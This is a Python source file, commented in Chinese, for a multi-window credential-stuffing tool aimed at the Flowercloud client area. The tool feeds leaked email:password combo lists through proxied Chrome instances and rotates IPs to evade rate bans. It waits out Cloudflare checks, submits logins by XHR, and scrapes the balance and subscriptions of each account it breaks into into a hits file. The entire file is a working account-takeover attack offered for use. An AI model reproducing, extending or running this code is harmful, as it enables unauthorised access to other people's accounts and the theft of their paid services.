# -*- coding: utf-8 -*-
"""
============================================================
  花云批量登录 - 多代理多窗口版 (DrissionPage + XHR)
  基于浪人单窗口版改写为多窗口并发版
============================================================
  每个窗口独立Chrome + 独立代理 + 独立Cookie
  每个IP跑30条combo后换IP
  被ban自动等180s + 刷新过盾
  combo不重复 (队列分发)
============================================================
"""
import sys
import os
import time
import random
import re
import threading
import queue
import gc

try:
    from DrissionPage import ChromiumPage, ChromiumOptions
except ImportError:
    print("[!] pip install DrissionPage")
    sys.exit(1)

try:
    import customtkinter as ctk
    from tkinter import filedialog, messagebox
    HAS_GUI = True
except ImportError:
    HAS_GUI = False

from proxy_checker import (
    Proxy, load_proxies_from_file, check_proxies_batch
)

# ============ 配置 ============
TARGET_BASE = "https://api-flowercloud.com"
TARGET_PAGE = TARGET_BASE + "/clientarea.php"
LOGOUT_URL = TARGET_BASE + "/logout.php"

COMBO_FILE = "combo_f.txt"
PROXY_FILE = "alive_proxies.txt"
GOOD_FILE = "hits.txt"
PROGRESS_FILE = "progress.txt"

COMBO_PER_IP = 30           # 每个IP跑多少条combo
DELAY_PER_REQ = 2.0        # 每条间隔
BAN_WAIT = 180              # 被封等待秒数
CF_WAIT_MAX = 180           # 过盾最大等待
TOKEN_REFRESH_EVERY = 25    # 每N条刷新token
MAX_WORKERS = 3             # 默认并发窗口数
BASE_PORT = 9300            # Chrome起始端口

BANNER = r"""
============================================================
  花云批量登录 - 多代理多窗口版
  每窗口独立Chrome+代理 | XHR登录 | 自动换IP
============================================================
"""

# ============ 工具函数 ============
def load_progress():
    if os.path.exists(PROGRESS_FILE):
        try:
            with open(PROGRESS_FILE, "r") as f:
                c = f.read().strip()
                if c.isdigit():
                    return int(c)
        except Exception:
            pass
    return 0

def save_progress(index):
    with open(PROGRESS_FILE, "w") as f:
        f.write(str(index))

def save_result(filename, content):
    with open(filename, "a", encoding="utf-8") as f:
        f.write(content + "\n")

def page_is_ready(page):
    try:
        return len(page.html) > 10000
    except Exception:
        return False

def is_banned(page):
    try:
        html = page.html
        if len(html) < 3000:
            h = html.lower()
            if "403 forbidden" in h or "openresty" in h or "429" in h or "been blocked" in h:
                return True
        return False
    except Exception:
        return False

def has_login_form(page):
    try:
        return page.run_js(
            "return !!(document.querySelector('#inputEmail') || "
            "document.querySelector('input[name=\"username\"]') || "
            "document.querySelector('input[type=\"email\"]'))"
        )
    except Exception:
        return False

def is_logged_in(page):
    try:
        return "logout.php" in page.html.lower()
    except Exception:
        return False

def wait_cf_pass(page, max_wait=CF_WAIT_MAX):
    start = time.time()
    while time.time() - start < max_wait:
        if page_is_ready(page):
            return True
        if is_banned(page):
            return False
        time.sleep(3)
    return page_is_ready(page)

def logout_force(page):
    try:
        page.run_js("try{var x=new XMLHttpRequest();x.open('GET','/logout.php',false);x.send();}catch(e){}")
    except Exception:
        pass
    time.sleep(0.5)

def reload_form_silent(page):
    js = """
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '/clientarea.php', false);
        xhr.send();
        if(xhr.status === 403 || xhr.status === 429) return 'banned';
        var html = xhr.responseText || '';
        var m = html.match(/name="token"\\s*value="([^"]+)"/);
        if(!m) m = html.match(/name='token'\\s*value='([^']+)'/);
        if(m && m[1]) {
            var el = document.querySelector('input[name="token"]');
            if(el) { el.value = m[1]; }
            return 'ok';
        }
        return 'no_token';
    } catch(e) { return 'error'; }
    """
    try:
        return page.run_js(js) == "ok"
    except Exception:
        return False

def do_login_xhr(page, email, password):
    js = """
    var token = '';
    var tokenEl = document.querySelector('input[name="token"]');
    if(tokenEl) token = tokenEl.value;
    if(!token) { var cv = (typeof csrfToken !== 'undefined') ? csrfToken : ''; token = cv; }
    if(!token) {
        try {
            var pre = new XMLHttpRequest();
            pre.open('GET', '/clientarea.php', false);
            pre.send();
            if(pre.status === 403 || pre.status === 429) return 'banned:pre';
            var preHtml = pre.responseText || '';
            if(preHtml.indexOf('logout.php') !== -1) return 'need_logout';
            var tm = preHtml.match(/name="token"\\s*value="([^"]+)"/);
            if(!tm) tm = preHtml.match(/name='token'\\s*value='([^']+)'/);
            if(tm && tm[1]) { token = tm[1]; if(tokenEl) tokenEl.value = token; }
        } catch(e) {}
    }
    if(!token) return 'error:no_token';
    var body = 'token=' + encodeURIComponent(token) + '&username=' + encodeURIComponent(arguments[0]) + '&password=' + encodeURIComponent(arguments[1]);
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/dologin.php', false);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send(body);
        var status = xhr.status;
        if(status === 403 || status === 429) return 'banned:' + status;
        var html = xhr.responseText || '';
        var url = xhr.responseURL || '';
        if(url.indexOf('incorrect') !== -1) return 'bad';
        if(html.indexOf('incorrect') !== -1) return 'bad';
        if(html.indexOf('logout.php') !== -1) return 'good:' + html.substring(0, 15000);
        return 'bad';
    } catch(e) { return 'error:' + e.message; }
    """
    try:
        return page.run_js(js, email, password)
    except Exception:
        return "js_error"

def extract_info_from_html(html):
    info = {"balance": "unknown", "services": "0", "products": []}
    try:
        m = re.search(r'可用余额.*?<h3[^>]*>(.*?)</h3>', html, re.DOTALL)
        if m:
            info["balance"] = m.group(1).strip()
        m = re.search(r'action=services[^>]*>产品服务</a>\s*<span[^>]*>(\d+)</span>', html, re.DOTALL)
        if m:
            info["services"] = m.group(1)
        products = re.findall(
            r'action=productdetails&(?:amp;)?id=(\d+)">\s*<span class="cell-title">([^<]+)</span>', html)
        for pid, pname in products:
            expire = "unknown"
            em = re.search(r'id=' + pid + r'.*?到期时间:\s*</span>\s*([\d\-]+)', html, re.DOTALL)
            if em:
                expire = em.group(1)
            info["products"].append({"id": pid, "name": pname.strip(), "expire": expire})
    except Exception:
        pass
    return info

def format_info(info):
    parts = ["balance=" + info["balance"], "services=" + info["services"]]
    for p in info["products"]:
        parts.append(p["name"] + "(id=" + p["id"] + ",exp=" + p["expire"] + ")")
    return " | ".join(parts)



# ============================================================
# 单窗口Worker - 每个窗口独立Chrome + 代理
# ============================================================
class WindowWorker:
    """独立窗口工作器：自己的Chrome、代理、Cookie"""

    def __init__(self, worker_id, proxy_list, combo_queue, result_lock,
                 stats, log_func=None, headless=False):
        self.worker_id = worker_id
        self.proxy_list = proxy_list  # 分配给此worker的代理列表
        self.combo_queue = combo_queue  # 共享combo队列
        self.result_lock = result_lock
        self.stats = stats  # 共享统计 dict
        self.log_func = log_func
        self.headless = headless
        self.page = None
        self.port = BASE_PORT + worker_id
        self.current_proxy_idx = 0
        self.running = True
        self.combo_count_on_ip = 0  # 当前IP已跑条数

    def log(self, msg):
        full_msg = f"[W{self.worker_id}] {msg}"
        if self.log_func:
            self.log_func(full_msg)
        else:
            print(full_msg, flush=True)

    def get_current_proxy(self):
        if not self.proxy_list:
            return None
        return self.proxy_list[self.current_proxy_idx % len(self.proxy_list)]

    def switch_proxy(self):
        """切换到下一个代理"""
        self.current_proxy_idx += 1
        self.combo_count_on_ip = 0
        proxy = self.get_current_proxy()
        self.log(f"换IP -> {proxy.to_url() if proxy else '直连'}")
        # 需要重启浏览器来切换代理
        self.close_browser()
        time.sleep(2)
        return self.start_browser()

    def start_browser(self):
        """启动带代理的Chrome"""
        self.close_browser()
        try:
            co = ChromiumOptions()
            co.set_local_port(self.port)
            co.set_argument('--no-first-run')
            co.set_argument('--no-default-browser-check')
            co.set_argument('--disable-infobars')
            co.set_argument('--disable-extensions')
            co.set_argument('--disable-gpu')
            co.set_argument('--disable-dev-shm-usage')
            co.set_argument('--no-sandbox')
            co.set_argument('--disable-background-networking')
            co.set_argument('--disable-sync')
            co.set_argument('--disable-translate')

            if self.headless:
                co.set_argument('--headless=new')

            # 设置代理
            proxy = self.get_current_proxy()
            if proxy:
                proxy_str = proxy.to_selenium_arg()
                co.set_argument(f'--proxy-server={proxy_str}')
                self.log(f"启动Chrome 端口{self.port} 代理:{proxy.to_url()}")
            else:
                self.log(f"启动Chrome 端口{self.port} 无代理")

            self.page = ChromiumPage(co)
            return True
        except Exception as e:
            self.log(f"Chrome启动失败: {e}")
            return False

    def close_browser(self):
        """关闭浏览器"""
        try:
            if self.page:
                self.page.quit()
        except Exception:
            pass
        self.page = None
        gc.collect()

    def init_page(self):
        """打开目标页面并等待过盾"""
        if not self.page:
            return False
        try:
            self.page.get(TARGET_PAGE)
            time.sleep(5)

            if is_banned(self.page):
                self.log("首次加载被封,等待...")
                return False

            if not page_is_ready(self.page):
                self.log("等待过盾...")
                if not wait_cf_pass(self.page, CF_WAIT_MAX):
                    self.log("过盾失败")
                    return False

            if is_logged_in(self.page):
                logout_force(self.page)
                time.sleep(1)

            if has_login_form(self.page) or reload_form_silent(self.page):
                self.log("页面就绪!")
                return True

            self.log("无法获取登录表单")
            return False
        except Exception as e:
            self.log(f"init_page异常: {e}")
            return False

    def handle_ban(self):
        """处理被封：等180s + 换IP + 刷新"""
        self.log(f"被封! 等待{BAN_WAIT}s后换IP...")
        with self.result_lock:
            self.stats["bans"] += 1

        # 等待
        waited = 0
        while waited < BAN_WAIT and self.running:
            chunk = min(30, BAN_WAIT - waited)
            time.sleep(chunk)
            waited += chunk
            remaining = BAN_WAIT - waited
            if remaining > 0:
                self.log(f"  等待中...剩{remaining}s")

        if not self.running:
            return False

        # 换IP
        if not self.switch_proxy():
            self.log("换IP后启动失败")
            return False

        # 重新打开页面
        return self.init_page()

    def run(self):
        """主循环：从队列取combo，登录，处理结果"""
        # 启动浏览器
        if not self.start_browser():
            self.log("启动失败,退出")
            return

        # 初始化页面
        if not self.init_page():
            # 尝试换IP
            if not self.switch_proxy() or not self.init_page():
                self.log("初始化失败,退出")
                self.close_browser()
                return

        batch_count = 0

        while self.running:
            # 从队列取combo
            try:
                idx, email, password = self.combo_queue.get_nowait()
            except queue.Empty:
                break

            # 检查是否需要换IP
            if self.combo_count_on_ip >= COMBO_PER_IP:
                self.log(f"已跑{self.combo_count_on_ip}条,换IP...")
                if not self.switch_proxy() or not self.init_page():
                    # 换IP失败,放回队列
                    self.combo_queue.put((idx, email, password))
                    time.sleep(10)
                    continue

            # 每TOKEN_REFRESH_EVERY条刷新token
            if batch_count > 0 and batch_count % TOKEN_REFRESH_EVERY == 0:
                if not reload_form_silent(self.page):
                    # 尝试刷新页面
                    self.page.get(TARGET_PAGE)
                    time.sleep(5)
                    if not page_is_ready(self.page):
                        wait_cf_pass(self.page, 60)
                    if is_logged_in(self.page):
                        logout_force(self.page)
                        time.sleep(1)

            # 执行登录
            result = do_login_xhr(self.page, email, password)

            # 处理登录残留
            if result == "need_logout":
                logout_force(self.page)
                time.sleep(1)
                reload_form_silent(self.page)
                result = do_login_xhr(self.page, email, password)

            # 处理被封
            if isinstance(result, str) and result.startswith("banned:"):
                self.log(f"[{idx+1}] {email} -> BANNED!")
                if not self.handle_ban():
                    self.combo_queue.put((idx, email, password))
                    break
                # 解封后重试
                result = do_login_xhr(self.page, email, password)
                if result == "need_logout":
                    logout_force(self.page)
                    time.sleep(1)
                    reload_form_silent(self.page)
                    result = do_login_xhr(self.page, email, password)
                if isinstance(result, str) and result.startswith("banned:"):
                    self.log("重试仍封,放回队列")
                    self.combo_queue.put((idx, email, password))
                    if not self.handle_ban():
                        break
                    continue

            # 处理结果
            self.combo_count_on_ip += 1
            batch_count += 1

            with self.result_lock:
                self.stats["processed"] += 1

                if isinstance(result, str) and result.startswith("good:"):
                    self.stats["hits"] += 1
                    html = result[5:]
                    info = extract_info_from_html(html)
                    svc = int(info["services"]) if info["services"].isdigit() else 0
                    tag = f"HIT[SUB={info['services']}]" if svc > 0 else "HIT[NOSUB]"
                    self.log(f"[{idx+1}] {email} -> {tag} {info['balance']}")
                    if info["products"]:
                        for p in info["products"]:
                            self.log(f"    -> {p['name']} exp:{p['expire']}")
                    save_result(GOOD_FILE, f"{email}:{password} | {format_info(info)}")

                    # 登出
                    logout_force(self.page)
                    time.sleep(1)
                    reload_form_silent(self.page)

                elif result == "bad" or (isinstance(result, str) and result == "bad"):
                    self.stats["failed"] += 1
                    self.log(f"[{idx+1}] {email} -> 失败")

                elif result == "js_error" or (isinstance(result, str) and result.startswith("error:")):
                    self.stats["errors"] += 1
                    self.log(f"[{idx+1}] {email} -> err:{result}")
                    if result == "error:no_token":
                        reload_form_silent(self.page)
                else:
                    self.stats["errors"] += 1
                    self.log(f"[{idx+1}] {email} -> 未知:{str(result)[:40]}")

                # 保存进度
                save_progress(self.stats["processed"])

            # 延迟
            time.sleep(random.uniform(DELAY_PER_REQ * 0.85, DELAY_PER_REQ * 1.15))

        self.log("工作结束")
        self.close_browser()



# ============================================================
# 多窗口调度引擎
# ============================================================
class MultiWindowEngine:
    """管理多个WindowWorker的调度引擎"""

    def __init__(self, proxies, combos, max_workers=MAX_WORKERS,
                 combo_per_ip=COMBO_PER_IP, headless=False, log_func=None):
        self.proxies = proxies
        self.combos = combos
        self.max_workers = max_workers
        self.combo_per_ip = combo_per_ip
        self.headless = headless
        self.log_func = log_func

        self.combo_queue = queue.Queue()
        self.result_lock = threading.Lock()
        self.stats = {
            "processed": 0,
            "hits": 0,
            "failed": 0,
            "errors": 0,
            "bans": 0,
            "total": len(combos)
        }
        self.workers = []
        self.threads = []
        self.running = False

    def log(self, msg):
        if self.log_func:
            self.log_func(msg)
        else:
            print(msg, flush=True)

    def start(self):
        """启动所有工作窗口"""
        self.running = True

        # 填充combo队列
        for i, (email, password) in enumerate(self.combos):
            self.combo_queue.put((i, email, password))

        self.log(f"[引擎] 总计 {len(self.combos)} 条combo")
        self.log(f"[引擎] 代理 {len(self.proxies)} 个 | 窗口 {self.max_workers} 个")
        self.log(f"[引擎] 每IP跑 {self.combo_per_ip} 条 | {'无头' if self.headless else '有头'}模式")

        # 给每个worker分配代理(轮流分)
        proxy_chunks = [[] for _ in range(self.max_workers)]
        for i, proxy in enumerate(self.proxies):
            proxy_chunks[i % self.max_workers].append(proxy)

        # 启动workers
        for wid in range(self.max_workers):
            worker = WindowWorker(
                worker_id=wid,
                proxy_list=proxy_chunks[wid],
                combo_queue=self.combo_queue,
                result_lock=self.result_lock,
                stats=self.stats,
                log_func=self.log_func,
                headless=self.headless
            )
            self.workers.append(worker)

            t = threading.Thread(target=worker.run, daemon=True)
            self.threads.append(t)
            t.start()
            time.sleep(3)  # 错开启动避免端口冲突

        # 监控线程
        monitor = threading.Thread(target=self._monitor, daemon=True)
        monitor.start()

    def stop(self):
        """停止所有worker"""
        self.running = False
        for w in self.workers:
            w.running = False
        self.log("[引擎] 正在停止...")

    def _monitor(self):
        """监控所有线程完成"""
        for t in self.threads:
            t.join()

        self.running = False
        s = self.stats
        self.log("")
        self.log("=" * 60)
        self.log("  全部完成!")
        self.log(f"  总计: {s['total']} | 已处理: {s['processed']}")
        self.log(f"  击中: {s['hits']} | 失败: {s['failed']} | 错误: {s['errors']}")
        self.log(f"  被封: {s['bans']} 次")
        self.log("=" * 60)


# ============================================================
# GUI 界面
# ============================================================
class FlowerLoginApp(ctk.CTk):
    """花云批量登录 GUI"""

    def __init__(self):
        super().__init__()
        self.title("花云批量登录 - 多代理多窗口版 v2.0")
        self.geometry("1050x720")
        self.minsize(950, 620)
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        self.proxies = []
        self.combos = []
        self.engine = None
        self._build_ui()

    def _build_ui(self):
        # 顶部
        top = ctk.CTkFrame(self)
        top.pack(fill="x", padx=10, pady=(10, 5))

        # Row 1: 文件
        r1 = ctk.CTkFrame(top, fg_color="transparent")
        r1.pack(fill="x", padx=10, pady=4)
        ctk.CTkLabel(r1, text="代理文件:").pack(side="left")
        self.proxy_var = ctk.StringVar(value="alive_proxies.txt")
        ctk.CTkEntry(r1, textvariable=self.proxy_var, width=220).pack(side="left", padx=5)
        ctk.CTkButton(r1, text="浏览", width=50, command=self._pick_proxy).pack(side="left", padx=(0, 15))
        ctk.CTkLabel(r1, text="Combo:").pack(side="left")
        self.combo_var = ctk.StringVar(value="combo_f.txt")
        ctk.CTkEntry(r1, textvariable=self.combo_var, width=220).pack(side="left", padx=5)
        ctk.CTkButton(r1, text="浏览", width=50, command=self._pick_combo).pack(side="left")

        # Row 2: 参数
        r2 = ctk.CTkFrame(top, fg_color="transparent")
        r2.pack(fill="x", padx=10, pady=4)
        ctk.CTkLabel(r2, text="窗口数:").pack(side="left")
        self.workers_var = ctk.StringVar(value="3")
        ctk.CTkEntry(r2, textvariable=self.workers_var, width=40).pack(side="left", padx=(5, 15))
        ctk.CTkLabel(r2, text="每IP条数:").pack(side="left")
        self.per_ip_var = ctk.StringVar(value="30")
        ctk.CTkEntry(r2, textvariable=self.per_ip_var, width=40).pack(side="left", padx=(5, 15))
        self.headless_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(r2, text="无头模式(省内存)", variable=self.headless_var).pack(side="left", padx=15)

        # Row 3: 按钮
        r3 = ctk.CTkFrame(top, fg_color="transparent")
        r3.pack(fill="x", padx=10, pady=4)
        self.btn_start = ctk.CTkButton(r3, text="开始", width=90, fg_color="#4CAF50", command=self._start)
        self.btn_start.pack(side="left", padx=5)
        self.btn_stop = ctk.CTkButton(r3, text="停止", width=90, fg_color="#F44336", command=self._stop)
        self.btn_stop.pack(side="left", padx=5)
        self.status_lbl = ctk.CTkLabel(r3, text="就绪", text_color="#00E676", font=("", 13, "bold"))
        self.status_lbl.pack(side="right", padx=10)

        # 统计
        info = ctk.CTkFrame(self)
        info.pack(fill="x", padx=10, pady=5)
        self.lbl_progress = ctk.CTkLabel(info, text="进度: 0/0")
        self.lbl_progress.pack(side="left", padx=10)
        self.lbl_hits = ctk.CTkLabel(info, text="击中: 0", text_color="#00E676", font=("", 12, "bold"))
        self.lbl_hits.pack(side="left", padx=10)
        self.lbl_failed = ctk.CTkLabel(info, text="失败: 0", text_color="#F44336")
        self.lbl_failed.pack(side="left", padx=10)
        self.lbl_bans = ctk.CTkLabel(info, text="封禁: 0", text_color="#FF9800")
        self.lbl_bans.pack(side="left", padx=10)

        # 进度条
        self.pbar = ctk.CTkProgressBar(self, height=8)
        self.pbar.pack(fill="x", padx=10, pady=4)
        self.pbar.set(0)

        # 日志
        lf = ctk.CTkFrame(self)
        lf.pack(fill="both", expand=True, padx=10, pady=(5, 10))
        self.log_box = ctk.CTkTextbox(lf, font=("Consolas", 11))
        self.log_box.pack(fill="both", expand=True, padx=5, pady=5)

        # 定时刷新统计
        self._refresh_stats()

    def _pick_proxy(self):
        p = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
        if p: self.proxy_var.set(p)

    def _pick_combo(self):
        p = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
        if p: self.combo_var.set(p)

    def _log(self, msg):
        def _do():
            self.log_box.insert("end", msg + "\n")
            self.log_box.see("end")
        self.after(0, _do)

    def _refresh_stats(self):
        if self.engine:
            s = self.engine.stats
            total = s["total"]
            done = s["processed"]
            self.lbl_progress.configure(text=f"进度: {done}/{total}")
            self.lbl_hits.configure(text=f"击中: {s['hits']}")
            self.lbl_failed.configure(text=f"失败: {s['failed']}")
            self.lbl_bans.configure(text=f"封禁: {s['bans']}")
            if total > 0:
                self.pbar.set(done / total)
        self.after(1000, self._refresh_stats)

    def _start(self):
        # 加载代理
        self.proxies = load_proxies_from_file(self.proxy_var.get())
        if not self.proxies:
            messagebox.showwarning("提示", "代理文件为空")
            return

        # 加载combo
        combo_path = self.combo_var.get()
        raw_combos = []
        try:
            content = None
            for enc in ["utf-8-sig", "utf-8", "gbk", "latin-1"]:
                try:
                    with open(combo_path, "r", encoding=enc) as f:
                        content = f.read()
                    break
                except (UnicodeDecodeError, UnicodeError):
                    continue
            if content:
                for line in content.splitlines():
                    line = line.strip()
                    if line and ":" in line:
                        parts = line.split(":", 1)
                        raw_combos.append((parts[0].strip(), parts[1].strip()))
        except Exception as e:
            messagebox.showwarning("错误", f"加载combo失败: {e}")
            return

        if not raw_combos:
            messagebox.showwarning("提示", "Combo文件为空")
            return

        self.combos = raw_combos
        workers = int(self.workers_var.get() or 3)
        per_ip = int(self.per_ip_var.get() or 30)

        global COMBO_PER_IP
        COMBO_PER_IP = per_ip

        self._log(f"[启动] 代理:{len(self.proxies)} | Combo:{len(self.combos)} | 窗口:{workers}")
        self.status_lbl.configure(text="运行中", text_color="#00E676")
        self.btn_start.configure(state="disabled")

        self.engine = MultiWindowEngine(
            proxies=self.proxies,
            combos=self.combos,
            max_workers=workers,
            combo_per_ip=per_ip,
            headless=self.headless_var.get(),
            log_func=self._log
        )
        threading.Thread(target=self.engine.start, daemon=True).start()

    def _stop(self):
        if self.engine:
            self.engine.stop()
        self.status_lbl.configure(text="已停止", text_color="#F44336")
        self.btn_start.configure(state="normal")
        self._log("[停止] 手动停止")


# ============================================================
# 命令行模式（无GUI时使用）
# ============================================================
def run_cli():
    print(BANNER)

    # 加载代理
    proxy_file = PROXY_FILE if os.path.exists(PROXY_FILE) else "proxies.txt"
    proxies = load_proxies_from_file(proxy_file)
    if not proxies:
        print(f"[!] 代理文件为空: {proxy_file}")
        sys.exit(1)
    print(f"[+] 代理: {len(proxies)} 个")

    # 加载combo
    if not os.path.exists(COMBO_FILE):
        print(f"[!] combo文件不存在: {COMBO_FILE}")
        sys.exit(1)

    combos = []
    with open(COMBO_FILE, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and ":" in line:
                parts = line.split(":", 1)
                combos.append((parts[0].strip(), parts[1].strip()))

    if not combos:
        print("[!] combo为空")
        sys.exit(1)

    print(f"[+] Combo: {len(combos)} 条")

    workers = int(input(f"并发窗口数 (默认{MAX_WORKERS}): ").strip() or MAX_WORKERS)
    headless = input("无头模式? (y/N): ").strip().lower() == "y"

    engine = MultiWindowEngine(
        proxies=proxies,
        combos=combos,
        max_workers=workers,
        headless=headless
    )
    engine.start()

    # 等待完成
    try:
        while engine.running:
            time.sleep(5)
            s = engine.stats
            print(f"  [进度:{s['processed']}/{s['total']} 击中:{s['hits']} 失败:{s['failed']} 封:{s['bans']}]")
    except KeyboardInterrupt:
        engine.stop()
        print("\n[!] 手动停止")


# ============================================================
# 入口
# ============================================================
if __name__ == "__main__":
    if HAS_GUI and "--cli" not in sys.argv:
        app = FlowerLoginApp()
        app.mainloop()
    else:
        run_cli()
